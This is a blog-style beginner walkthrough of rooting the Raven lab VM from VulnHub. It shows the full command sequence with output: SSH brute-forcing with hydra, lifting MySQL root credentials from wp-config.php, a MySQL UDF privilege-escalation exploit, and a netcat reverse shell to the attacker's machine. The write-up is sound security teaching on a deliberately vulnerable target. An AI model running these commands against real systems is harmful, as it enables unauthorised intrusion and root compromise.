---
layout: post
title: "Raven hacking challenge"
date: 2018-11-08 10:42:21 -0500
comments: true
categories: boot2root
---

[Raven](https://www.vulnhub.com/entry/raven-1,256/) is another boot2root challenge currently available for download at [VulnHub](https://vulnhub.com/). One of the cool things about Raven is it's actually kind of realistic and a fairly easy challenge, which makes it a great boot2root for learning how to hack. I had been wanting to do a sort of tutorial for beginners for a while now, and I think Raven is a good challenge to do this writeup on. So unlike my previous writeups where I just mention the tools or techniques I use to escalate to root privileges, I'll spend more time in this one talking about my thought processes, and my failures. Just in case anyone thinks it takes me 5 minutes to solve these challenges, it doesn't. There's a lot of swearing, and red herrings along the way. 

According to Raven's description, there are four flags to pick up. I've only found two, no idea where the other two are, but the focus of this tutorial will be to escalate to root privileges rather than hunting down flags. Also there's more than one way to root this challenge. It turns out that the solution I came up with skipped a part of the challenge so I took the less scenic route. 

I'll be using standard tools that are available in a stock Kali VM. I sometimes prefer to use scripts that I've custom written, but let's keep this simple. So if you want to follow along, grab a copy of Kali Linux [here](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/) and run it in either VirtualBox or VMware along with Raven. 

In the case of these boot2root challenges, the IP address of the target is usually not provided to us. By default, Kali and Raven will be running in their own virtualized subnet so the IP address for Raven won't be hard to find. Some people use `nmap` for this, I prefer to just use `netdiscover`. First I need to know what IP my Kali VM is on. I'll use `ifconfig` for that: 

```
root@kali:~# ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.206.132  netmask 255.255.255.0  broadcast 192.168.206.255
        inet6 fe80::20c:29ff:fe33:fb3e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:33:fb:3e  txqueuelen 1000  (Ethernet)
        RX packets 501  bytes 47915 (46.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 302  bytes 40976 (40.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

It's 192.168.206.132, which means I'm on the 192.168.206.0/24 network. Now I can pass that information to `netdiscover`: 

```
root@kali:~# netdiscover -r 192.168.206.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.206.1   00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.206.2   00:50:56:f2:38:16      1      60  VMware, Inc.
 192.168.206.131 00:0c:29:fe:2e:e8      1      60  VMware, Inc.
 192.168.206.254 00:50:56:ed:ba:4c      1      60  VMware, Inc.
```

So four IP addresses have shown up. Of the four, 192.168.206.131 is the one assigned to Raven. With the target's IP located, we can begin the enumeration phase. Before continuing, you should also add the IP address to your /etc/hosts. The reason for this is the target's website breaks if it can't resolve http://raven.local. I'm not sure why this wasn't mentioned in Raven's download page, but there it is. Just run this in Kali (making sure you substitute your Raven's IP address):

```
root@kali:~# echo "192.168.206.131 raven.local" >> /etc/hosts
```

Now we can refer to the target as raven.local instead of by its IP address. 

Enumeration typically starts with figuring out what ports are running on the target. Open ports are tied to services running on the target, and if they happen to be poorly configured, or outdated, it may be possible to leverage that and exploit them in some way. The most popular tool for port scanning is `nmap`. Since this is a boot2root challenge, I'll go ahead and scan for all 65,534 TCP ports to be thorough. I'll also go with more aggressive options for `nmap`: 

```
root@kali:~# nmap -sV -A -p- raven.local
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-08 23:28 EST
Nmap scan report for raven.local (192.168.206.131)
Host is up (0.00052s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38431/tcp  status
|_  100024  1          55843/udp  status
38431/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:FE:2E:E8 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms raven.local (192.168.206.131)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.02 seconds
```

So `nmap` has discovered at least four open ports. Out of the four, ports 22 (SSH) and 80 (HTTP) are good places to start. SSH because if we can find login credentials we can get a shell on the server. HTTP, because often times we may be able to discover additional information about what's running on the server that can assist us in getting a shell. Enumeration is key, and web servers are a good source of information on discovering "hidden" files or directories, users in an organization, web applications that may be vulnerable, and so on. 

When I see a web server running, I usually fire up `nikto`. Nikto will do some probing on the web server and look for juicy things that might be of interest to us. 

```
root@kali:~# nikto -host http://raven.local
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.206.131
+ Target Hostname:    raven.local
+ Target Port:        80
+ Start Time:         2018-11-08 23:29:52 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x41b3 0x5734482bdcb00
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Uncommon header 'link' found, with contents: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ 7445 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2018-11-08 23:30:03 (GMT-5) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto has reported on a few things that we can look into. Directories like `/img` and `/manual` are common for Apache installations, so those become a lower priority for me to investigate. The `/wordpress` directory indicating a Wordpress installation is however interesting. Wordpress plugins tend to get outdated and may be vulnerable to a variety of things. On top of that, Wordpress has this behaviour in its login interface which allows us to enumerate existing user accounts. 

For enumerating Wordpress, I use `wpscan`. It performs a variety of things from examining the version of Wordpress and its plugins for any vulnerabilities, as well as attempting to enumerate and bruteforce user accounts it discovers. Before you can use `wpscan`, you need to update its database:

```
root@kali:~# wpscan --update
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed
```

With the update completed, I pointed `wpscan` to the target and waited for results: 

```
root@kali:~# wpscan -u http://raven.local/wordpress -e
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://raven.local/wordpress/
[+] Started: Thu Nov  8 23:39:37 2018

[+] Interesting header: LINK: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
[+] XML-RPC Interface available under: http://raven.local/wordpress/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://raven.local/wordpress/index.php/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+---------+
| Name    |
+---------+
| michael |
+---------+
[!] Includes directory has directory listing enabled: http://raven.local/wordpress/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 4.8.7 (Released on 2018-07-05) identified from meta generator, links opml

[+] WordPress theme in use: twentyseventeen - v1.3

[+] Name: twentyseventeen - v1.3
 |  Last updated: 2018-08-02T00:00:00.000Z
 |  Location: http://raven.local/wordpress/wp-content/themes/twentyseventeen/
 |  Readme: http://raven.local/wordpress/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.7
 |  Style URL: http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:00:01 <==================================================================================================================> (1667 / 1667) 100.00% Time: 00:00:01

[+] No plugins found

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:00 <====================================================================================================================> (287 / 287) 100.00% Time: 00:00:00

[+] No themes found

[+] Enumerating timthumb files ...

   Time: 00:00:01 <==================================================================================================================> (2574 / 2574) 100.00% Time: 00:00:01

[+] No timthumb files found

[+] Enumerating usernames ...
[+] We identified the following 2 users:
    +----+---------+---------------+
    | ID | Login   | Name          |
    +----+---------+---------------+
    | 1  | michael | michae        |
    | 2  | steven  | Steven Seagul |
    +----+---------+---------------+

[+] Finished: Thu Nov  8 23:39:48 2018
[+] Elapsed time: 00:00:10
[+] Requests made: 4937
[+] Memory used: 64.414 MB
```

Alright, lots of interesting information here. First, we've found the version of Wordpress being used, along with a couple of usernames `michael` and `steven`. The default Wordpress login is usually in `wp-admin.php`, so launch Firefox in Kali and point it to http://raven.local/wordpress/wp-login.php. 

Now here's the part where I chased down the wrong path and lost some time. My initial thought was to see if I could bruteforce the passwords for both of these accounts. `wpscan` has that option. I tried several wordlists including `rockyou.txt` (found in `/usr/share/wordlists` in Kali).

When it became clear that it would take way too long to bruteforce the password, I decided to try a directory/file scan on the target using `dirbuster`. It found a whole bunch of directories and files, but nothing that I could leverage or use to move forward. 

I then started going through the site manually, checking each page, looking at the HTML source for clues, but once again, nothing of interest stood out. 

At this point, I realized it may be time to move on to a different service. SSH on port 22 was the other interesting one identified by `nmap`. Having the usernames `michael` and `steven`, I wondered if I could perform a bruteforce attack on those instead against the SSH service. For that I used `hydra`. 

I decided to use the `rockyou.txt` wordlist and just bruteforce each username one at a time. By default `rockyou.txt` is gzip'd so you'll need to unzip it first before you can use it: 

```
root@kali:~# gunzip /usr/share/wordlists/rockyou.txt.gz
```

`hydra` takes a variety of options. For SSH it's important to increase the timing between requests, otherwise you start getting errors. The other options I'll use will attempt to use the username as the password, verbose mode, logging the results to a file, and quitting once it finds the password. 

```
root@kali:~# hydra -l michael -e nsr -V -o hydra.log -t8 -f ssh://raven.local
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-08 23:50:38
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://raven.local:22/
[ATTEMPT] target raven.local - login "michael" - pass "michael" - 1 of 3 [child 0] (0/0)
[ATTEMPT] target raven.local - login "michael" - pass "" - 2 of 3 [child 1] (0/0)
[ATTEMPT] target raven.local - login "michael" - pass "leahcim" - 3 of 3 [child 2] (0/0)
[22][ssh] host: raven.local   login: michael   password: michael
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-08 23:50:39
```

After having wasted all the time trying to bruteforce Wordpress, it turned out that the password for `michael` on SSH was `michael`. So with the user credentials on hand, let's log in: 

```
root@kali:~# ssh michael@raven.local
Warning: Permanently added the ECDSA host key for IP address '192.168.206.131' to the list of known hosts.
michael@raven.local's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
michael@Raven:~$
```

Great, I now had a foothold on the target. The process of enumeration starts all over again. The goal this time is to escalate our privileges to a higher user account, preferably to that of the root user. First let's see what we can do with `michael's` account: 

```
michael@Raven:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

So it looks like a standard user account that belongs to a variety of groups. One thing I usually check at this point, especially since I have the password, is to see if the user has `sudo` privileges. This often means the user can run certain commands as the root user, and that's usually a good way to escalate privileges. 

```
michael@Raven:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for michael:
Sorry, user michael may not run sudo on raven.
michael@Raven:~$
```

Unfortunately in this case, that wasn't happening. So the next steps I performed here were to look for additional users, check configuration files in /etc, and look at processes running on the system. 

With regards to users, there was one other user called `steven`. This could be seen from the `/home/steven` directory, as well as simply listing the contents of `/etc/passwd`. Steven's home directory was empty and it was owned by root, so only root could write to it. I didn't see anything of interest in `/etc/` that I could leverage at this time. 

I looked the processes running on the target next: 

```
michael@Raven:~$ ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root        916  0.0 10.6 881656 52132 ?        Sl   15:03   0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root -
.
.
.
root       1349  0.0  1.0  78224  5136 ?        S    15:53   0:00 sendmail: MTA: ./wA943ZqB000560 apc.olc.protection.outlook.com.: user open
```

I've cut it down for brevity, but from the list, a couple of processes stuck out. The first was that `mysqld` was running as the root user, and there was a `sendmail` process running as well. 

MySQL was interesting, because if it was running as root, then that meant I might be able to read contents from a file owned by root into the the database, and write contents from a table into a file on the filesystem that only root could write to. But before I could do that, I needed root login credentials to MySQL.

Fortunately, Wordpress installations require the use of MySQL, which meant it had to store the credentials in a file somewhere. And that file is `wp-config.php`. Web documents are typically stored in `/var/www/html` on Linux, so I navigated to there and found a the `wordpress/wp-config.php` file there. Looking at its contents, I found the MySQL root credentials (cut for brevity): 

```
.
.
.
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
.
.
.
```

I tested to make sure it worked, and sure enough, it did:

```
michael@Raven:~$ mysql -uroot -p'R@v3nSecurity'
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 64
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

So how to exploit this? Well there's a thing called User Defined Functions (UDF) in MySQL. The short of it is we need to somehow write a shared library containing the functions we want to execute within MySQL in MySQL's plugin directory. The plugin directory is root writable only and is in `/usr/lib/mysql/plugin/`. So the idea is to compile this shared library, read it into a table in MySQL, then dump the contents of that table into a file in `/usr/lib/mysql/plugin/`. This is possible because we have root credentials to the database, and `mysqld` is running as root. 

Kali already contains a large number of exploits, so we can just use `searchsploit` to search for UDF: 

```
root@kali:~# searchsploit mysql udf
---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                    |  Path
                                                                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                                            | exploits/linux/local/1181.c
MySQL 4/5/6 - UDF for Command Execution                                                                                           | exploits/linux/local/7856.txt
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                                           | exploits/linux/local/1518.c
---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

I used the third one: `exploits/linux/local/1518.c`. I copied this over to my current working directory and the instructions on how to use it are described in the file (again, cut for brevity): 

```
root@kali:~# cat 1518.c
.
.
.
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
.
.
.
```

Seems easy enough. I compiled the shared library in my Kali instance: 

```
root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/1518.c .
root@kali:~# gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
```

Once that was done, I copied it over to the target's `/tmp` directory via `scp`:

```
root@kali:~# scp 1518.so michael@raven.local:/tmp
michael@raven.local's password:
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
1518.so
```

We can ignore the warning. The `1518.so` file should now be in `/tmp` on the target. We can verify this:

```
michael@Raven:~$ ls -l /tmp/
total 20
-rwxr-xr-x 1 michael michael 19136 Nov  9 16:18 1518.so
```

Ok, let's see if we can utilize this UDF exploit technique. Log into MySQL as root and run the following commands as I did: 

```
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/tmp/1518.so'));
Query OK, 1 row affected (0.01 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
Query OK, 1 row affected (0.01 sec)

mysql> create function do_system returns integer soname '1518.so';
Query OK, 0 rows affected (0.00 sec)
```

Quick explanation of what's happening here. The first line creates a table that takes a blob (Binary Large Object). The reason we use a blob is because we're going to be copying the contents of `/tmp/1518.so` into this table and that shared library is a binary. That's exacly what the second line does with the `load_file` function. 

The third line takes the contents of that table and dumps it into a `/usr/lib/mysql/plugin/1518.so`. This is basically a roundabout way to write files to root-writable only locations. So technically you could use this technique to read the contents of `/etc/shadow`, edit the hash for the root account with one that you have the password to, and dump the contents of that table to `/etc/shadow` thereby overwriting it. However, I'd prefer not to modify any important files, so let's  keep going. 

The fourth line creates a function called `do_system()` that will allow us to run any commands as the root user. Let's see it in action. The first command I'll try is `id` just to make sure that we're running as root. It'll save the output into `/tmp/out`:  

```
mysql> select do_system('id > /tmp/out; chmod 644 /tmp/out');
+------------------------------------------------+
| do_system('id > /tmp/out; chmod 644 /tmp/out') |
+------------------------------------------------+
|                                              0 |
+------------------------------------------------+
1 row in set (0.00 sec)
```

By default the file will be readable only by root, so I chain the `chmod` command at the end of `id` to make the file world-readable. 

We can login to another SSH session as `michael` and read the contens of `/tmp/out`:

```
michael@Raven:~$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
```

Excellent, the `id` command reported that it's running as the root user. So what can we do? Pretty much anything at this point since we have root command execution. However let's complete the challenge by getting a shell. I'm going to obtain a reverse shell as the root user by using the `nc` command. `nc` or netcat is a sort of swiss army network tool. One feature that some versions of netcat have is to connect back to a server and shovel a shell to the listening server. In this case I'll use it to connect back to my machine with a root shell. 

First, I need to setup my machine to listen to a specific port for netcat to connect to. In this case, I'll use port 443. So on my Kali instance: 

```
root@kali:~# nc -lvp 443
listening on [any] 443 ...
```

Next, back on the target's MySQL instance, I use netcat and specify the IP address of my machine, the port to connect to, and the `-e` flag to specify what command to execute: 

```
mysql> select do_system('nc 192.168.206.132 443 -e /bin/bash');
```

Upon executing this MySQL should just "freeze". That's because it's now established a connection to my Kali instance and we can see that from our netcat listener: 

```
root@kali:~# nc -lvp 443
listening on [any] 443 ...
connect to [192.168.206.132] from raven.local [192.168.206.131] 46850
```

The netcat listener has reported that the target has connected to it. Although there is no shell prompt, we can actually start typing commands: 

```
root@kali:~# nc -lvp 443
listening on [any] 443 ...
connect to [192.168.206.132] from raven.local [192.168.206.131] 46850
id
uid=0(root) gid=0(root) groups=0(root)
```

We can see that we're now the root user. To verify we're actually root on the target, we can pull up it's IP address and the contents of the `/root` directory: 


```
ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:0c:29:fe:2e:e8
          inet addr:192.168.206.131  Bcast:192.168.206.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fefe:2ee8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:149756 errors:0 dropped:0 overruns:0 frame:0
          TX packets:153237 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:11526665 (10.9 MiB)  TX bytes:29539647 (28.1 MiB)

ls -l /root/
total 4
-rw-r--r-- 1 root root 442 Aug 13 12:22 flag4.txt
```

There's that `flag4.txt` which is supposed to be the last flag on the target. Might as well read it to finish the challenge: 

```
cat /root/flag4.txt
______

| ___ \

| |_/ /__ ___   _____ _ __

|    // _` \ \ / / _ \ '_ \

| |\ \ (_| |\ V /  __/ | | |

\_| \_\__,_| \_/ \___|_| |_|


flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought:

@mccannwj / wjmccann.github.io
```

Awesome, mission accomplished! Hopefully that all made sense and was relatively easy to follow. The point was to show the thought process of hacking into a machine by using enumeration, triaging the findings, and trial and error to see what exploits or techniques worked, and what didn't. 

Now there are supposed to be a couple of ways to solve this challenge. If you're interested, see if you can figure out the other way(s), and maybe even find the other flags. 
